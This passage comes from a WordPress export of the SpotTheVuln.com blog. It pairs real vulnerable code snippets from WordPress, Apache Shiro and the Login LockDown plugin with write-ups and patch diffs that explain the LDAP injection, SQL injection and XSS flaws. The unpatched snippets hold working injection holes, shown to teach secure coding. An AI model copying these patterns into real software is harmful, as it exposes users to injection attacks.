+                       $item = "&lt;h4&gt;&lt;a href='$url' title='" . sprintf( __( 'Edit &amp;#8220;%s&amp;#8221;' ), esc_attr( $title ) ) . "'&gt;" . esc_html($title) . "&lt;/a&gt; &lt;abbr title='" . get_the_time(__('Y/m/d g:i:s A'), $draft) . "'&gt;" . get_the_time( get_option( 'date_format' ), $draft ) . '&lt;/abbr&gt;&lt;/h4&gt;';
   if ( $the_content = preg_split( '#\s#', strip_tags( $draft-&gt;post_content ), 11, PREG_SPLIT_NO_EMPTY ) )
                                $item .= '&lt;p&gt;' . join( ' ', array_slice( $the_content, 0, 10 ) ) . ( 10 &lt; count( $the_content ) ? '&amp;hellip;' : '' ) . '&lt;/p&gt;';
                        $list[] = $item;
                }
?&gt;
        &lt;ul&gt;
                &lt;li&gt;&lt;?php echo join( "&lt;/li&gt;\n&lt;li&gt;", $list ); ?&gt;&lt;/li&gt;
        &lt;/ul&gt;
        &lt;p&gt;&lt;a href="edit.php?post_status=draft"&gt;&lt;?php _e('View all'); ?&gt;&lt;/a&gt;&lt;/p&gt;
&lt;?php
        } else {
                _e('There are no drafts at the moment');
        }
}
 
/**
 * Display recent comments dashboard widget content.
 *
 * @since unknown
 */
function wp_dashboard_recent_comments() {
        global $wpdb;
 
        if ( current_user_can('edit_posts') )
                $allowed_states = array('0', '1');
        else
                $allowed_states = array('1');
 
        // Select all comment types and filter out spam later for better query performance.
        $comments = array();
        $start = 0;
 
        while ( count( $comments ) &lt; 5 &amp;&amp; $possible = $wpdb-&gt;get_results( "SELECT * FROM $wpdb-&gt;comments c LEFT JOIN $wpdb-&gt;posts p ON c.comment_post_ID = p.ID WHERE p.post_status != 'trash' ORDER BY c.comment_date_gmt DESC LIMIT $start, 50" ) ) {
 
                foreach ( $possible as $comment ) {
                        if ( count( $comments ) &gt;= 5 )
                                break;
                        if ( in_array( $comment-&gt;comment_approved, $allowed_states ) )
                                $comments[] = $comment;
                }
 
                $start = $start + 50;
        }
 
        if ( $comments ) :
?&gt;

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>790</wp:post_id>
		<wp:post_date>2010-04-09 08:59:22</wp:post_date>
		<wp:post_date_gmt>2010-04-09 15:59:22</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>working-clothes-xss</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="encode"><![CDATA[Encode]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/aExzoa]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[c510d47d3338f2ab85d28ff4c9470e13]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Meaningless</title>
		<link>http://spotthevuln.com/2010/04/meaningless/</link>
		<pubDate>Mon, 12 Apr 2010 15:00:53 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=794</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Facts are meaningless. You could use facts to prove anything that's even remotely true.
- Homer Simpson</strong></blockquote>
[ccnLe_java]

protected AuthorizationInfo buildAuthorizationInfo(Set&lt;String&gt; roleNames) {
        return new SimpleAuthorizationInfo(roleNames);
    }

    private Set&lt;String&gt; getRoleNamesForUser(String username, LdapContext ldapContext) throws NamingException {
        Set&lt;String&gt; roleNames;
        roleNames = new LinkedHashSet&lt;String&gt;();

        SearchControls searchCtls = new SearchControls();
        searchCtls.setSearchScope(SearchControls.SUBTREE_SCOPE);

        String userPrincipalName = username;
        if (principalSuffix != null) {
            userPrincipalName += principalSuffix;
        }

        String searchFilter = "(&amp;(objectClass=*)(userPrincipalName=" + userPrincipalName + "))";

        NamingEnumeration answer = ldapContext.search(searchBase, searchFilter, searchCtls);

        while (answer.hasMoreElements()) {
            SearchResult sr = (SearchResult) answer.next();

            if (log.isDebugEnabled()) {
                log.debug("Retrieving group names for user [" + sr.getName() + "]");
            }

            Attributes attrs = sr.getAttributes();

            if (attrs != null) {
                NamingEnumeration ae = attrs.getAll();
                while (ae.hasMore()) {
                    Attribute attr = (Attribute) ae.next();

                    if (attr.getID().equals("memberOf")) {

                        Collection&lt;String&gt; groupNames = LdapUtils.getAllAttributeValues(attr);

                        if (log.isDebugEnabled()) {
                            log.debug("Groups found for user [" + username + "]: " + groupNames);
                        }

                        Collection&lt;String&gt; rolesForGroups = getRoleNamesForGroups(groupNames);
                        roleNames.addAll(rolesForGroups);
                    }
                }
            }
        }
        return roleNames;
    }

    /**
     * This method is called by the default implementation to translate Active Directory group names
     * to role names.  This implementation uses the <a href="mailto:{@link">{@link</a> #groupRolesMap} to map group names to role names.
     *
     * @param groupNames the group names that apply to the current user.
     * @return a collection of roles that are implied by the given role names.
     */
    protected Collection&lt;String&gt; getRoleNamesForGroups(Collection&lt;String&gt; groupNames) {
        Set&lt;String&gt; roleNames = new HashSet&lt;String&gt;(groupNames.size());

        if (groupRolesMap != null) {
            for (String groupName : groupNames) {
                String strRoleNames = groupRolesMap.get(groupName);
                if (strRoleNames != null) {
                    for (String roleName : strRoleNames.split(ROLE_NAMES_DELIMETER)) {

                        if (log.isDebugEnabled()) {
                            log.debug("User is member of group [" + groupName + "] so adding role [" + roleName + "]");
                        }

                        roleNames.add(roleName);

                    }
                }
            }
        }
        return roleNames;
    }

}

[/ccnLe_java] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>794</wp:post_id>
		<wp:post_date>2010-04-12 08:00:53</wp:post_date>
		<wp:post_date_gmt>2010-04-12 15:00:53</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>meaningless</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[8ea88e20a72a22876b642ca00a279bc7]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/d0r2Ph]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>459</wp:comment_id>
			<wp:comment_author><![CDATA[Vulnerable Source Code &#8211; Meaningless &#8211; LDAP Injection ~ SpotTheVuln.com &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/04/meaningless-ldap-injection/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-04-16 09:02:52</wp:comment_date>
			<wp:comment_date_gmt>2010-04-16 16:02:52</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Meaningless [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Meaningless – LDAP Injection</title>
		<link>http://spotthevuln.com/2010/04/meaningless-ldap-injection/</link>
		<pubDate>Fri, 16 Apr 2010 15:00:57 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=799</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Apache Shiro Project

Fixed in Version: Revision 887987

Issue Type: LDAP Injection

Original Code: <a title="Meaningless" href="http://spotthevuln.com/2010/04/meaningless/" target="_blank">Found Here</a>
<h2>Description</h2>
This patch fixes a LDAP injection vulnerability in the Apache Shiro Project.  A quick glance of the vulnerable code shows several references to LDAP and LDAP queries scattered throughout the sample code.  In this example, we see that the Shiro developers originally used the username to dynamically build a LDAP query.  The symptoms are very similar to a typical SQL injection.  The username is used in a string building technique to build the LDAP query which eventually gets passed to an LDAP server.  If an attacker crafts the proper username, they could have the ability to modify the original LDAP query and execute an arbitrary LDAP query of their choosing.

Just as the symptoms are very similar to SQL injection, the fix also looks very similar to code that would be used to fix a SQL injection vulnerability.  The developers helped the application make a distinction between code and data by removing the string built LDAP query
<h2>Developers Solution</h2>
[cce lang="diff"]
<div id="_mcePaste">

protected AuthorizationInfo buildAuthorizationInfo(Set&lt;String&gt; roleNames) {

return new SimpleAuthorizationInfo(roleNames);

}

private Set&lt;String&gt; getRoleNamesForUser(String username, LdapContext ldapContext) throws NamingException {

Set&lt;String&gt; roleNames;

roleNames = new LinkedHashSet&lt;String&gt;();

SearchControls searchCtls = new SearchControls();

searchCtls.setSearchScope(SearchControls.SUBTREE_SCOPE);

String userPrincipalName = username;

if (principalSuffix != null) {

userPrincipalName += principalSuffix;

}

-       String searchFilter = "(&amp;(objectClass=*)(userPrincipalName=" + userPrincipalName + "))";

+       //SHIRO-115 - prevent potential code injection:

+       String searchFilter = "(&amp;(objectClass=*)(userPrincipalName={0}))";

+       Object[] searchArguments = new Object[]{userPrincipalName};

-       NamingEnumeration answer = ldapContext.search(searchBase, searchFilter, searchCtls);

+      NamingEnumeration answer = ldapContext.search(searchBase, searchFilter, searchArguments, searchCtls);

while (answer.hasMoreElements()) {

SearchResult sr = (SearchResult) answer.next();

if (log.isDebugEnabled()) {

log.debug("Retrieving group names for user [" + sr.getName() + "]");

}

Attributes attrs = sr.getAttributes();

if (attrs != null) {

NamingEnumeration ae = attrs.getAll();

while (ae.hasMore()) {

Attribute attr = (Attribute) ae.next();

if (attr.getID().equals("memberOf")) {

Collection&lt;String&gt; groupNames = LdapUtils.getAllAttributeValues(attr);

if (log.isDebugEnabled()) {

log.debug("Groups found for user [" + username + "]: " + groupNames);

}

Collection&lt;String&gt; rolesForGroups = getRoleNamesForGroups(groupNames);

roleNames.addAll(rolesForGroups);

}

}

}

}

return roleNames;

}

/**

* This method is called by the default implementation to translate Active Directory group names

* to role names.  This implementation uses the {@link #groupRolesMap} to map group names to role names.

*

* @param groupNames the group names that apply to the current user.

* @return a collection of roles that are implied by the given role names.

*/

protected Collection&lt;String&gt; getRoleNamesForGroups(Collection&lt;String&gt; groupNames) {

Set&lt;String&gt; roleNames = new HashSet&lt;String&gt;(groupNames.size());

if (groupRolesMap != null) {

for (String groupName : groupNames) {

String strRoleNames = groupRolesMap.get(groupName);

if (strRoleNames != null) {

for (String roleName : strRoleNames.split(ROLE_NAMES_DELIMETER)) {

if (log.isDebugEnabled()) {

log.debug("User is member of group [" + groupName + "] so adding role [" + roleName + "]");

}

roleNames.add(roleName);

}

}

}

}

return roleNames;

}

}

</div>
[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>799</wp:post_id>
		<wp:post_date>2010-04-16 08:00:57</wp:post_date>
		<wp:post_date_gmt>2010-04-16 15:00:57</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>meaningless-ldap-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="apache-software"><![CDATA[Apache]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="category" nicename="ldap-injection"><![CDATA[LDAP Injection]]></category>
		<category domain="category" nicename="shiro"><![CDATA[Shiro]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Meaningless - LDAP Injection]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Meaningless - LDAP Injection]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[32fa27aa747b0c81b3b07348af143c75]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cxO204]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[32fa27aa747b0c81b3b07348af143c75]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Butterflies</title>
		<link>http://spotthevuln.com/2010/04/butterflies/</link>
		<pubDate>Tue, 20 Apr 2010 06:00:55 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=810</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>It's so bizarre, I'm not scared of snakes or spiders. But I'm scared of butterflies. There is something eerie about them. Something weird!</strong>
- Nicole Kidman</blockquote>
[ccnLe_php]

&lt;?php

function print_loginlockdownAdminPage() {

global $wpdb;

$table_name = $wpdb-&gt;prefix . "lockdowns";

$loginlockdownAdminOptions = get_loginlockdownOptions();

if (isset($_POST['update_loginlockdownSettings'])) {

if (isset($_POST['ll_max_login_retries'])) {

$loginlockdownAdminOptions['max_login_retries'] = $_POST['ll_max_login_retries'];

}

if (isset($_POST['ll_retries_within'])) {

$loginlockdownAdminOptions['retries_within'] = $_POST['ll_retries_within'];

}

if (isset($_POST['ll_lockout_length'])) {

$loginlockdownAdminOptions['lockout_length'] = $_POST['ll_lockout_length'];

}

if (isset($_POST['ll_lockout_invalid_usernames'])) {

$loginlockdownAdminOptions['lockout_invalid_usernames'] = $_POST['ll_lockout_invalid_usernames'];

}

if (isset($_POST['ll_mask_login_errors'])) {

$loginlockdownAdminOptions['mask_login_errors'] = $_POST['ll_mask_login_errors'];

}

update_option("loginlockdownAdminOptions", $loginlockdownAdminOptions);

?&gt;

&lt;div&gt;&lt;p&gt;&lt;strong&gt;&lt;?php _e("Settings Updated.", "loginlockdown");?&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/div&gt;

&lt;?php

}

if (isset($_POST['release_lockdowns'])) {

if (isset($_POST['releaseme'])) {

$released = $_POST['releaseme'];

foreach ( $released as $release_id ) {

$results = $wpdb-&gt;query("UPDATE $table_name SET release_date = now() " .

"WHERE lockdown_ID = $release_id");

}

}

update_option("loginlockdownAdminOptions", $loginlockdownAdminOptions);

?&gt;

&lt;div&gt;&lt;p&gt;&lt;strong&gt;&lt;?php _e("Lockdowns Released.", "loginlockdown");?&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/div&gt;

&lt;?php

}

$dalist = listLockedDown();

?&gt;

&lt;div&gt;

&lt;form method="post" action="&lt;?php echo $_SERVER["REQUEST_URI"]; ?&gt;"&gt;

&lt;h2&gt;&lt;?php _e('Login LockDown Options', 'loginlockdown') ?&gt;&lt;/h2&gt;

&lt;h3&gt;&lt;?php _e('Max Login Retries', 'loginlockdown') ?&gt;&lt;/h3&gt;

&lt;input type="text" name="ll_max_login_retries" size="8" value="&lt;?php echo $loginlockdownAdminOptions['max_login_retries']; ?&gt;"&gt;

&lt;h3&gt;&lt;?php _e('Retry Time Period Restriction (minutes)', 'loginlockdown') ?&gt;&lt;/h3&gt;

&lt;input type="text" name="ll_retries_within" size="8" value="&lt;?php echo $loginlockdownAdminOptions['retries_within']; ?&gt;"&gt;

&lt;h3&gt;&lt;?php _e('Lockout Length (minutes)', 'loginlockdown') ?&gt;&lt;/h3&gt;

&lt;input type="text" name="ll_lockout_length" size="8" value="&lt;?php echo $loginlockdownAdminOptions['lockout_length']; ?&gt;"&gt;

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>810</wp:post_id>
		<wp:post_date>2010-04-19 23:00:55</wp:post_date>
		<wp:post_date_gmt>2010-04-20 06:00:55</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>butterflies</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[c0180d133300105010535833b9791d7b]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/bBX7Uq]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>461</wp:comment_id>
			<wp:comment_author><![CDATA[Vulnerable Source Code &#8211; Butterflies &#8211; SQL Injection / XSS ~ SpotTheVuln.com &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/04/butterflies-sql-injection-xss/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-04-23 08:11:15</wp:comment_date>
			<wp:comment_date_gmt>2010-04-23 15:11:15</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Butterflies [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Butterflies – SQL Injection / XSS</title>
		<link>http://spotthevuln.com/2010/04/butterflies-sql-injection-xss/</link>
		<pubDate>Fri, 23 Apr 2010 15:00:00 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=815</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: WordPress Plugin Login LockDown

Fixed in Version: 1.5

Issue Type: SQL Injection and XSS

Original Code: <a title="Butterflies" href="http://spotthevuln.com/2010/04/butterflies/" target="_blank">Found Here</a>
<h2>Description</h2>
In a SpotTheVuln first, today’s example actually contains two different vulnerabilities.  The sample comes from a WordPress plugin called “Login Lockdown”.  The first vulnerability patched by the Login Lockdown developers is a SQL Injection vulnerability.  In this particular example, we see that the “$release_id” variable is passed directly to a SQL statement without being sanitized.  The Login Lockdown developers corrected this vulnerability by simply escaping the variable before including it in a dynamically built SQL statement.

The other vulnerabilities are XSS vulnerabilities.  The beginning of the code sample contains several “isset” statements which eventually assign the values from various POST parameters to php variables.  These variables are then used to build the HTML markup later in the PHP code.  The Login Lockdown developers corrected this vulnerability by using the “esc_attr” before using the user controlled data in the HTML markup.
<h2>Developers Solution</h2>
[cce lang="diff"]
<div id="_mcePaste">

&lt;?php

function print_loginlockdownAdminPage() {

global $wpdb;

$table_name = $wpdb-&gt;prefix . "lockdowns";

$loginlockdownAdminOptions = get_loginlockdownOptions();

if (isset($_POST['update_loginlockdownSettings'])) {

if (isset($_POST['ll_max_login_retries'])) {

$loginlockdownAdminOptions['max_login_retries'] = $_POST['ll_max_login_retries'];

}

if (isset($_POST['ll_retries_within'])) {

$loginlockdownAdminOptions['retries_within'] = $_POST['ll_retries_within'];

}

if (isset($_POST['ll_lockout_length'])) {

$loginlockdownAdminOptions['lockout_length'] = $_POST['ll_lockout_length'];

}

if (isset($_POST['ll_lockout_invalid_usernames'])) {

$loginlockdownAdminOptions['lockout_invalid_usernames'] = $_POST['ll_lockout_invalid_usernames'];

}

if (isset($_POST['ll_mask_login_errors'])) {

$loginlockdownAdminOptions['mask_login_errors'] = $_POST['ll_mask_login_errors'];

}

update_option("loginlockdownAdminOptions", $loginlockdownAdminOptions);

?&gt;

&lt;div class="updated"&gt;&lt;p&gt;&lt;strong&gt;&lt;?php _e("Settings Updated.", "loginlockdown");?&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/div&gt;

&lt;?php

}

if (isset($_POST['release_lockdowns'])) {

if (isset($_POST['releaseme'])) {

$released = $_POST['releaseme'];

foreach ( $released as $release_id ) {

$results = $wpdb-&gt;query("UPDATE $table_name SET release_date = now() " .

- "WHERE lockdown_ID = $release_id");

+ "WHERE lockdown_ID = " . $wpdb-&gt;escape($release_id) . "");

}

}

update_option("loginlockdownAdminOptions", $loginlockdownAdminOptions);

?&gt;

&lt;div class="updated"&gt;&lt;p&gt;&lt;strong&gt;&lt;?php _e("Lockdowns Released.", "loginlockdown");?&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/div&gt;

&lt;?php

}

$dalist = listLockedDown();

?&gt;

&lt;div&gt;

&lt;form method="post" action="&lt;?php echo $_SERVER["REQUEST_URI"]; ?&gt;"&gt;

&lt;h2&gt;&lt;?php _e('Login LockDown Options', 'loginlockdown') ?&gt;&lt;/h2&gt;

&lt;h3&gt;&lt;?php _e('Max Login Retries', 'loginlockdown') ?&gt;&lt;/h3&gt;

-&lt;input type="text" name="ll_max_login_retries" size="8" value="&lt;?php echo $loginlockdownAdminOptions['max_login_retries']; ?&gt;"&gt;

+&lt;input type="text" name="ll_max_login_retries" size="8" value="&lt;?php echo esc_attr($loginlockdownAdminOptions['max_login_retries']); ?&gt;"&gt;

&lt;h3&gt;&lt;?php _e('Retry Time Period Restriction (minutes)', 'loginlockdown') ?&gt;&lt;/h3&gt;

-&lt;input type="text" name="ll_retries_within" size="8" value="&lt;?php echo $loginlockdownAdminOptions['retries_within']; ?&gt;"&gt;

+&lt;input type="text" name="ll_retries_within" size="8" value="&lt;?php echo esc_attr($loginlockdownAdminOptions['retries_within']); ?&gt;"&gt;

&lt;h3&gt;&lt;?php _e('Lockout Length (minutes)', 'loginlockdown') ?&gt;&lt;/h3&gt;

-&lt;input type="text" name="ll_lockout_length" size="8" value="&lt;?php echo $loginlockdownAdminOptions['lockout_length']; ?&gt;"&gt;

+&lt;input type="text" name="ll_lockout_length" size="8" value="&lt;?php echo esc_attr($loginlockdownAdminOptions['lockout_length']); ?&gt;"&gt;

</div>
[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>815</wp:post_id>
		<wp:post_date>2010-04-23 08:00:00</wp:post_date>
